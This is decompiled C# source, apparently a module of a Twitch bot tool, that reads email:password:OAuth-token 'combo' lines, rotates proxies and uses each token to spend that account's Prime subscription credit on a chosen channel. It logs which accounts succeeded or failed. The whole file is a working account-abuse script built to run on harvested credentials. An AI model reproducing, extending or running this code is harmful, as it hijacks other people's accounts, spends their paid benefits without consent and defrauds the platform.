using System;
using System.Text.RegularExpressions;
using System.Threading;
using Leaf.xNet;
using RONIN.Core.BackEnd.SlavLib;
using RONIN.Core.BackEnd.Variables;

namespace dotTwitch.Core.Modules
{
	// Token: 0x02000017 RID: 23
	internal class Sub
	{
		// Token: 0x06000068 RID: 104 RVA: 0x00003776 File Offset: 0x00001976
		public static void Set()
		{
			Console.WriteLine("[What's the name of the channel you'd like to send subs to?]");
			Sub.channel = Console.ReadLine();
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00008484 File Offset: 0x00006684
		public static void DoWork()
		{
			for (;;)
			{
				SlavCore.UpdateTitle("Subs Sent", Sub.bTotal, null, 0);
				if (Var.comboQueue.Count != 0)
				{
					try
					{
						string text = Var.comboQueue.Take();
						for (;;)
						{
							try
							{
								if (text.Contains(":") || text.Contains(";") || text.Contains("|"))
								{
									string[] array = text.Split(new char[]
									{
										':',
										';',
										'|'
									});
									string text2 = array[0];
									string text3 = array[1];
									string text4 = array[2];
									if (text2.Contains("@"))
									{
										string text5 = text2.Split(new char[]
										{
											'@'
										})[0];
									}
									HttpRequest httpRequest = new HttpRequest();
									try
									{
										try
										{
											httpRequest.IgnoreProtocolErrors = true;
											httpRequest.KeepAlive = true;
											if (Var.proxies.Count != 0)
											{
												httpRequest.Proxy = SlavCore.LoadProxyType();
											}
											string value = Regex.Match(httpRequest.Get(string.Concat(new string[]
											{
												"https://api.twitch.tv/api/channels/",
												Sub.channel,
												"/access_token?need_https=true&oauth_token=",
												text4,
												"&platform=web&player_backend=mediaplayer&player_type=site"
											}), null).ToString(), "channel_id\\\\\":(.*?),\\\\\"chansub").Groups[1].Value;
											httpRequest.AddHeader("Authorization", "OAuth " + text4);
											string str = string.Concat(new string[]
											{
												"[{\"operationName\":\"ChannelPage_SubscribeButton_User\",\"variables\":{\"login\":\"",
												Sub.channel,
												"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"a1da17caf3041632c3f9b4069dfc8d93ff10b5b5023307ec0a694a9d8eae991e\"}}},{\"operationName\":\"ChannelPage_SubscribeBalloon_User\",\"variables\":{\"login\":\"",
												Sub.channel,
												"\",\"productId\":\"713380\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"996b7f2d7d4857bfb9739371aee349c0d901728fcc156c17958fe5c7277b35a2\"}}}]"
											});
											string input = httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString();
											string value2 = Regex.Match(input, "user\":{\"id\":\"(.*?)\",\"displayName\"").Groups[1].Value;
											string value3 = Regex.Match(input, "currentUser\":{\"id\":\"(.*?)\",\"__typename").Groups[1].Value;
											httpRequest.AddHeader("Authorization", "OAuth " + text4);
											string str2 = string.Concat(new string[]
											{
												"[{\"operationName\":\"PrimeSubscribe_SpendPrimeSubscriptionCredit\",\"variables\":{\"input\":{\"broadcasterID\":\"",
												value2,
												"\",\"userID\":\"",
												value3,
												"\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"639d5286f985631f9ff66c5bd622d839f73113bae9ed44ec371aa9110563254c\"}}}]"
											});
											if (httpRequest.Post("https://gql.twitch.tv/gql", str2, "text/plain;charset=UTF-8").ToString().Contains("\"UNABLE_TO_SPEND\""))
											{
												SlavCore.Invalid();
												Console.ForegroundColor = ConsoleColor.Red;
												Console.WriteLine(text + " is unable to subscribe");
											}
											else
											{
												Console.ForegroundColor = ConsoleColor.Green;
												Console.WriteLine(text + " subscribed");
												Console.WriteLine();
												Interlocked.Increment(ref Sub.bTotal);
												SlavCore.Custom();
											}
										}
										catch (HttpException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (NullReferenceException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (Exception ex)
										{
											Console.WriteLine(ex.ToString());
											SlavCore.Error();
											continue;
										}
										break;
									}
									finally
									{
										httpRequest.Dispose();
									}
								}
								SlavCore.Invalid();
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
								SlavCore.Error();
								continue;
							}
							break;
						}
						continue;
					}
					catch (Exception ex3)
					{
						Console.WriteLine(ex3.ToString());
						continue;
					}
					break;
				}
				break;
			}
			Var.threads--;
		}

		// Token: 0x04000048 RID: 72
		public static int bTotal = 0;

		// Token: 0x04000049 RID: 73
		public static string channel = string.Empty;
	}
}
